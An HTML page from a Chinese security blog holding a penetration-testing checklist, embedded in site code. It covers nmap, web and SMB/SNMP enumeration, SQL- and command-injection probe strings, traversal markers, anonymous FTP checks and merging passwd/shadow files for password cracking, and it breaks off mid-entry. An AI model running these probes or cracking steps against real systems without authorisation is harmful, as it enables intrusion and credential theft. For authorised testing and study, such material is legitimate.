<!DOCTYPE html><html lang="zh-CN" class="vertical-scrollbar" data-astro-transition-scope="astro-smooz4hq-1"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><meta name="generator" content="Astro v5.16.6"><title>Common process for handling objectives | Penetration | 应神上の博客</title><!-- Preconnect to third-party origins for faster resource loading --><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="preconnect" href="https://chinese-font.netlify.app" crossorigin><link rel="dns-prefetch" href="https://chinese-font.netlify.app"><!-- Async load Chinese fonts to avoid render-blocking --><link rel="stylesheet" href="/fonts/ChillRoundFRegular/result.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/fonts/ChillRoundFBold/result.css" media="print" onload="this.media='all'"><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.QW52Ox2j.js"></script><style>.astro-loading-indicator {
  pointer-events: none;
  background-color: #e9536a;
  position: fixed;
  z-index: 1031;
  top: 0;
  left: 0;
  width: 100%;
  height: 2px;
  transition: transform 300ms ease-out, opacity 150ms 150ms ease-in;
	transform: translate3d(0, 0, 0) scaleX(var(--progress, 0));
  transform-origin: 0;
}

[dir="rtl"] .astro-loading-indicator {
  transform-origin: 100% 0;
}
</style><script>(function(){const className = "astro-loading-indicator";
const animationDuration = 300;
const threshold = 200;

(() => {
  let progress = 0.25
  let opacity = 0
  /** @type {number | undefined} */
  let trickleInterval = undefined
  /** @type {number | undefined} */
  let thresholdTimeout = undefined;

  const element = document.createElement("div")
  element.classList.add(className)
  element.ariaHidden = "true"

  /** @param {typeof progress} _progress */
  const setProgress = (_progress) => {
    progress = _progress
    element.style.setProperty('--progress', String(progress))
  }

  /** @param {typeof opacity} _opacity */
  const setOpacity = (_opacity) => {
    opacity = _opacity
    element.style.setProperty('opacity', String(opacity))
  }

  setOpacity(opacity)

  document.addEventListener("DOMContentLoaded", () => {
    document.body.prepend(element)
  })

  document.addEventListener("astro:before-preparation", () => {
    thresholdTimeout = setTimeout(() => {
      setOpacity(1)
      trickleInterval = window.setInterval(() => {
        setProgress(progress + Math.random() * 0.03)
      }, animationDuration)
    }, threshold)
  })

  document.addEventListener("astro:before-swap", (ev) => {
    if (!thresholdTimeout) {
      return
    }
    window.clearTimeout(thresholdTimeout)

    ev.newDocument.body.prepend(element)
    window.clearInterval(trickleInterval)
    trickleInterval = undefined

    setProgress(1)
    window.setTimeout(() => {
      setOpacity(0)
    }, animationDuration / 2)

    window.setTimeout(() => {
      setProgress(0.25)
    }, animationDuration * 2)
  })
})()
})();</script><script type="module" src="/_astro/Tooltips.astro_astro_type_script_index_0_lang.Bx2cGmPu.js"></script><!-- metadata --><meta name="description" content="Nmap基本扫描 针对端口指纹和漏洞的扫描 针对 web 端口的枚举 针对已知的服务进行攻击尝试，搜索漏洞信息 漏洞来源： 针对 web 页面的测试 检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget 在线搜索资源（比如 github），如"><meta name="author" content="snow"><meta property="og:type" content="website"><meta property="og:site_name" content="Kaguya"><meta property="og:url" content="https://xhblog.top/blog/post/11/"><meta property="og:title" content="Common process for handling objectives | Penetration | 应神上の博客"><meta property="og:description" content="Nmap基本扫描 针对端口指纹和漏洞的扫描 针对 web 端口的枚举 针对已知的服务进行攻击尝试，搜索漏洞信息 漏洞来源： 针对 web 页面的测试 检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget 在线搜索资源（比如 github），如"><!-- <meta property="og:image" content="/opengraph.png?v=1" /> TODO: og image--><meta name="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://xhblog.top/blog/post/11/"><meta name="twitter:title" content="Common process for handling objectives | Penetration | 应神上の博客"><meta name="twitter:description" content="Nmap基本扫描 针对端口指纹和漏洞的扫描 针对 web 端口的枚举 针对已知的服务进行攻击尝试，搜索漏洞信息 漏洞来源： 针对 web 页面的测试 检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget 在线搜索资源（比如 github），如"><script>
      // 立即执行主题检查 否则会闪烁
      if (
        localStorage.theme === 'dark' ||
        (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)
      ) {
        document.documentElement.classList.add('dark');
        document.documentElement.classList.remove('light');
        document.documentElement.dataset.theme = 'dark';
      } else {
        document.documentElement.classList.remove('dark');
        document.documentElement.classList.add('light');
        document.documentElement.dataset.theme = 'light';
      }
    </script><script>
      // iOS Safari pinch-zoom guard (viewport meta alone is not always respected)
      (() => {
        const blockGesture = (event) => event.preventDefault();
        document.addEventListener('gesturestart', blockGesture, { passive: false });
        document.addEventListener('gesturechange', blockGesture, { passive: false });
        document.addEventListener('gestureend', blockGesture, { passive: false });
      })();
    </script><!--主题检查切换对应值--><script type="module" src="/_astro/Layout.astro_astro_type_script_index_0_lang.c530qLiS.js"></script><!--FIXED:  SPA主题切换不渲染, tab栏切换变浅色问题。--><script type="module">function e(){localStorage.theme==="dark"||!("theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?(document.documentElement.classList.add("dark"),document.documentElement.classList.remove("light"),document.documentElement.dataset.theme="dark"):(document.documentElement.classList.remove("dark"),document.documentElement.classList.add("light"),document.documentElement.dataset.theme="light")}document.addEventListener("astro:page-load",e);</script><link rel="stylesheet" href="/_astro/about.w_pREgQ8.css">
<link rel="stylesheet" href="/_astro/_slug_.D059aVq8.css">
<link rel="stylesheet" href="/_astro/about.CnCfUIIe.css">
<link rel="stylesheet" href="/_astro/index.Lf6pSiPd.css"><script type="module" src="/_astro/page.B5GOxY8C.js"></script><style>[data-astro-transition-scope="astro-smooz4hq-1"] { view-transition-name: root; }@layer astro { ::view-transition-old(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }::view-transition-new(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }</style></head> <body> <div class="flex min-h-screen flex-col text-black dark:text-white"> <style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var a=(s,i,o)=>{let r=async()=>{await(await s())()},t=typeof i.value=="object"?i.value:void 0,c={rootMargin:t==null?void 0:t.rootMargin},n=new IntersectionObserver(e=>{for(let l of e)if(l.isIntersecting){n.disconnect(),r();break}},c);for(let e of o.children)n.observe(e)};(self.Astro||(self.Astro={})).visible=a;window.dispatchEvent(new Event("astro:visible"));})();</script><script>(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script><astro-island uid="ZQLopT" prefix="r11" component-url="/_astro/Header.pToUiH43.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;isPostPage&quot;:[0,true],&quot;tocNumbering&quot;:[0,true],&quot;tocHeadings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;nmap基本扫描&quot;],&quot;text&quot;:[0,&quot;Nmap基本扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;],&quot;text&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-端口的枚举&quot;],&quot;text&quot;:[0,&quot;针对 web 端口的枚举&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对已知的服务进行攻击尝试搜索漏洞信息&quot;],&quot;text&quot;:[0,&quot;针对已知的服务进行攻击尝试，搜索漏洞信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-页面的测试&quot;],&quot;text&quot;:[0,&quot;针对 web 页面的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-netbiossmbrpc-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 NETBIOS、SMB、RPC 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-smtp-端口的尝试&quot;],&quot;text&quot;:[0,&quot;针对 SMTP 端口的尝试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-snmp-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 SNMP 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-ftp-端口测试&quot;],&quot;text&quot;:[0,&quot;针对 FTP 端口测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;密码破解&quot;],&quot;text&quot;:[0,&quot;密码破解&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;数据包抓取&quot;],&quot;text&quot;:[0,&quot;数据包抓取&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;参考资料&quot;],&quot;text&quot;:[0,&quot;参考资料&quot;]}]]]}" ssr client="visible" opts="{&quot;name&quot;:&quot;Header&quot;,&quot;value&quot;:true}" await-children><link rel="preload" as="image" href="/_astro/logo.Gai7gqE6.webp"/><div id="site-header" class="shadow-text fixed inset-x-0 top-0 z-10 gap-4 py-2.5 text-white select-none tablet:backdrop-blur tablet:py-2 tablet:pl-3 tablet:pr-3" style="view-transition-name:site-header"><div class="site-header-bg pointer-events-none absolute inset-0"></div><div class="relative z-10 mx-auto flex items-center justify-between px-6 tablet:w-full tablet:px-0 max-w-7xl"><a class="tablet:hidden -my-4 mr-4 flex cursor-pointer items-center justify-center gap-1 whitespace-nowrap" href="/blog" target="_self" title="Kaguya" aria-label="Kaguya" data-astro-transition-persist="page-header-avatar" style="view-transition-name:page-header-avatar"><img src="/_astro/logo.Gai7gqE6.webp" alt="Kaguya" class="mt-2 mb-2 h-16"/></a><div class="tablet:flex w-full h-full tablet:grow hidden items-center justify-center"><a href="/blog" class="flex items-center gap-1"><img src="/_astro/logo.Gai7gqE6.webp" alt="Kaguya" class="h-8" height="32"/></a></div><div class="tablet:grow-0 flex grow items-center" style="view-transition-name:page-header"><div class="tablet:hidden flex grow items-center gap-4"><a href="/blog" aria-label="首页" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-house-chimney" aria-hidden="true"></i>首页</a><button class="inline-flex h-10 items-center px-4 py-2 text-base tracking-wider relative after:absolute after:bottom-1 after:left-1/2 after:h-0.5 after:w-0 after:-translate-x-1/2 after:bg-white after:transition-all after:duration-300 after:content-[&quot;&quot;]" aria-expanded="false" aria-haspopup="dialog" aria-label="文章菜单"><i class="mr-1.5 text-sm fa-solid fa-pen-nib" aria-hidden="true"></i>文章<i class="fa-solid fa-caret-down absolute -right-1.5 text-xl transition-transform duration-300" aria-hidden="true"></i></button><a href="/blog/friends" aria-label="友链" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-link" aria-hidden="true"></i>友链</a><a href="/blog/about" aria-label="关于" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-regular fa-circle-user" aria-hidden="true"></i>关于</a></div><div class="ml-auto flex items-center gap-2"><button id="search-trigger" class="group cursor-pointer transition duration-300 hover:scale-125" aria-label="搜索" title="搜索 (⌘K)"><i class="fa-solid fa-magnifying-glass text-2xl" aria-hidden="true"></i></button><div id="search-component-portal" style="display:none;position:absolute;pointer-events:none;visibility:hidden"><div id="search-for-dialog" class="pagefind-ui" data-pagefind-ui="true"></div></div><style>
        .scroll-feather-mask {
          container-type: scroll-state;
        }
        @container scroll-state(scrollable: bottom) {
          .scroll-feather-mask::before {
            content: '';
            background: linear-gradient(
              to bottom,
              transparent 0%,
              var(--gradient-bg-start) var(--scroll-mask-middle, 70%),
              var(--gradient-bg-start) var(--scroll-mask-end, 100%)
            );
            position: absolute;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 10;
            display: block;
            height: var(--scroll-mask-height, 5rem);
          }
        }
      </style><button class="theme-toggle text-2xl cursor-pointer bg-transparent border-0 p-0 transition-transform duration-300 hover:scale-110" id="theme-toggle-btn" type="button" aria-label="toggle theme" aria-pressed="false"><i class="fa-solid fa-sun text-2xl light-icon transition-all duration-300" style="opacity:1;transform:rotate(0deg) scale(1)"></i><i class="fa-solid fa-moon text-2xl dark-icon transition-all duration-300" style="opacity:0;transform:rotate(-180deg) scale(0)"></i></button><style>
        .theme-toggle {
          position: relative;
          z-index: 10;
          width: 36px;
          height: 36px;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .theme-toggle i {
          position: absolute;
          text-shadow: none;
          filter: none;
        }
      </style></div></div></div></div><!--astro:end--></astro-island> <main class="relative flex grow flex-col gap-4">   <div class="flex flex-col"> <div class="relative flex h-[60dvh] max-h-200 overflow-hidden"> <div class="absolute inset-0 h-full bg-black/40"></div> <div class="absolute inset-0 bottom-[8dvh] flex flex-col items-center justify-center px-5 text-white">  <h1 class="shadow-text word-break text-4.5xl text-center font-bold md:text-2xl max-w-7xl flex flex-wrap items-center justify-center gap-3"> Common process for handling objectives  </h1> <p class="mt-3 flex items-center justify-center gap-4 md:text-xs"> <span class="flex items-center gap-1"> <i class="fa-regular fa-calendar-days" aria-hidden="true"></i>
发表于 2026-02-05 </span> <span class="flex items-center gap-1"> <i class="fa-solid fa-pen-nib" aria-hidden="true"></i> 745 字
</span> <span class="flex items-center gap-1"> <i class="fa-regular fa-clock" aria-hidden="true"></i> 4 min read </span> </p> </div> <div class="relative -z-10 h-full min-h-60 w-full" data-astro-transition-persist="page-cover-banner" id="banner-box" style="background-image:linear-gradient(135deg, #c8cfc8 0%, #9b9e94 50%, #72817a 100%)"> <img src="/img/backgrounds/imgi_12_8612031707.webp" alt="cover" class="h-full w-full object-cover" sizes="50vw"> </div> <div class="wave-wrap"><svg class="wave" xmlns="http://www.w3.org/2000/svg" viewBox="0 24 150 28" preserveAspectRatio="none"><defs><path id="gentle-wave" d="m -160,44.4 c 30,0 58,-18 87.7,-18 30.3,0 58.3,18 87.3,18 30,0 58,-18 88,-18 30,0 58,18 88,18 l 0,34.5 -351,0 z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="50" y="0" fill="rgba(255, 255, 255, 0.48)"></use><use xlink:href="#gentle-wave" x="50" y="3" fill="rgba(255, 255, 255, 0.78)"></use><use xlink:href="#gentle-wave" x="50" y="6" fill="rgba(255, 255, 255, 0.8)"></use></g></svg></div> </div> <div class="mx-auto md:mx-0 flex w-full items-start justify-center md:w-full max-w-7xl"> <div class="page-home-sider shadow-home-sider sticky top-0 self-start flex min-w-64 max-w-64 flex-col tablet:hidden overflow-hidden h-screen min-h-0 items-center px-2" transition:name="page-home-sider"> <script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).load=e;window.dispatchEvent(new Event("astro:load"));})();</script><astro-island uid="Z1N67lj" prefix="r10" component-url="/_astro/HomeSiderPanel.DH6R6lQo.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;type&quot;:[0,&quot;post&quot;],&quot;defaultSegmentType&quot;:[0,&quot;directory&quot;],&quot;homeInfo&quot;:[0,{&quot;avatar&quot;:[0,&quot;/img/724d7fb480c8ac0db472ca5c7e36d239.jpg&quot;],&quot;name&quot;:[0,&quot;Kaguya&quot;],&quot;description&quot;:[0,&quot;ACG / 养猫人 / 菜逼 / 黑客 / 臭美&quot;],&quot;postCount&quot;:[0,11],&quot;categoryCount&quot;:[0,4],&quot;tagCount&quot;:[0,8],&quot;routes&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;首页&quot;],&quot;path&quot;:[0,&quot;/blog&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-house-chimney&quot;]}],[0,{&quot;name&quot;:[0,&quot;文章&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-pen-nib&quot;],&quot;children&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;分类&quot;],&quot;path&quot;:[0,&quot;/blog/categories&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-layer-group&quot;]}],[0,{&quot;name&quot;:[0,&quot;标签&quot;],&quot;path&quot;:[0,&quot;/blog/tags&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-tags&quot;]}]]]}],[0,{&quot;name&quot;:[0,&quot;友链&quot;],&quot;path&quot;:[0,&quot;/blog/friends&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-link&quot;]}],[0,{&quot;name&quot;:[0,&quot;关于&quot;],&quot;path&quot;:[0,&quot;/blog/about&quot;],&quot;icon&quot;:[0,&quot;fa-regular fa-circle-user&quot;]}]]],&quot;currentPath&quot;:[0,&quot;/blog/post/11/&quot;]}],&quot;tocHeadings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;nmap基本扫描&quot;],&quot;text&quot;:[0,&quot;Nmap基本扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;],&quot;text&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-端口的枚举&quot;],&quot;text&quot;:[0,&quot;针对 web 端口的枚举&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对已知的服务进行攻击尝试搜索漏洞信息&quot;],&quot;text&quot;:[0,&quot;针对已知的服务进行攻击尝试，搜索漏洞信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-页面的测试&quot;],&quot;text&quot;:[0,&quot;针对 web 页面的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-netbiossmbrpc-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 NETBIOS、SMB、RPC 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-smtp-端口的尝试&quot;],&quot;text&quot;:[0,&quot;针对 SMTP 端口的尝试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-snmp-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 SNMP 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-ftp-端口测试&quot;],&quot;text&quot;:[0,&quot;针对 FTP 端口测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;密码破解&quot;],&quot;text&quot;:[0,&quot;密码破解&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;数据包抓取&quot;],&quot;text&quot;:[0,&quot;数据包抓取&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;参考资料&quot;],&quot;text&quot;:[0,&quot;参考资料&quot;]}]]],&quot;tocNumbering&quot;:[0,true],&quot;seriesPostItems&quot;:[1,[[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/common-process-for-handling-objectives&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Common process for handling objectives&quot;],&quot;date&quot;:[3,&quot;2026-02-05T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# Nmap基本扫描\n```\nnmap -Pn -p- -vv\nnmap -Pn -p- -sU -vv\n```\n***\n# 针对端口指纹和漏洞的扫描\n```\nNmap -Pn -sV -O -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln &lt;ip address&gt;\n# 使用nc查看banner\nnc -nv &lt;ip-address&gt; &lt;port&gt;\n```\n***\n# 针对 web 端口的枚举\n```\nNikto -port {web ports} -host &lt;ip address&gt; -o &lt;output file.txt&gt;\n# 目录扫描\nDirb http{s}://&lt;ip address&gt;:&lt;port&gt; /usr/share/wordlist/dirb/{common/small/vulns}.txt\nGobuster -u http://&lt;ip-address&gt; -w /usr/share/Seclists/Discovery/Web_Content/common.txt\n#如果想测试文件包含漏洞，可以使用 fimap：\nfimap -u &lt;ip-address&gt;\n```\n***\n# 针对已知的服务进行攻击尝试，搜索漏洞信息\n```\nSearchsploit &lt;service name&gt;\n```\n漏洞来源：\n&lt;https://www.securityfocus.com/vulnerabilities&gt;\n***\n# 针对 web 页面的测试\n检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget\n在线搜索资源（比如 github），如果应用程序是开源的，根据网站枚举的信息猜测版本，然后找出可能存在的风险\n检查 HTTP 选项\n```\n测试输入表单参数（比如 1&#39; or 1=1 limit 1; # AND 1&#39; or 1=1--）\n● NULL 或 null\n● &#39;, \&quot;, ;, &lt;!\n  ○ 中断 SQL 字符串或查询，常用于 SQL、XPath、XML 注入\n● -, =, +, \&quot;\n  ○ 用于手工 SQL 注入测试\n● &#39;, &amp;, ! , ¦ , &lt; , &gt;\n  ○ 用于找出命令执行漏洞\n● ../\n  ○ 目录穿越漏洞\n```\n***\n# 针对 NETBIOS、SMB、RPC 端口的测试\n```\nenum4linux -a &lt;ip address&gt; Rpcclient &lt;ip address&gt; -U \&quot;\&quot; -N Rpcinfo -p &lt;target ip&gt;\n```\n关于 RPC 历史漏洞的合集：\nhttp://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/\n以下是常用的远程测试命令\n```\nShowmount -e &lt;ip address&gt;/&lt;port&gt; \nMount -t cifs //&lt;server ip&gt;/&lt;share&gt; &lt;local dir&gt; -o username=”guest”,password=”” \nRlogin &lt;ip-address&gt; Smbclient -L &lt;ip-address&gt; -U “” -N Nbtscan -r &lt;ip address&gt; \nNet use &lt;ip-address&gt;$Share “” /u:”” \nNet view &lt;ip-address&gt;\n```\n还可以使用 NMAP 的脚本测试 SMB、DCERPC、NETBIOS\n***\n# 针对 SMTP 端口的尝试\n枚举用户，使用 VRFY 和 EXPN 命令\n***\n# 针对 SNMP 端口的测试\n默认共享名称如：public, private, cisco, manager\n使用工具：\n```\nOnesixtyone –c &lt;community list file&gt; -I &lt;ip-address&gt; Snmpwalk -c &lt;community string&gt; -v&lt;version&gt; &lt;ip address&gt;\n# 默认 MIB：\n1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports\n# 比如枚举运行的进程\nnmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2\n```\n***\n# 针对 FTP 端口测试\n```\n● anonymous 是否可以登录\n● 如果可以登录是否可以使用 get 或 send 操作文件\n● 使用浏览器是否可以访问，ftp://&lt;ip-address&gt;\n```\n***\n# 密码破解\n在 linux 下可以使用 unshadow 命令合并 passwd 和 shadow 文件：\n```\nunshadow [passwd-file] [shadow-file] &gt; unshadowed.txt\n# 可以使用的 hash-identifier 识别 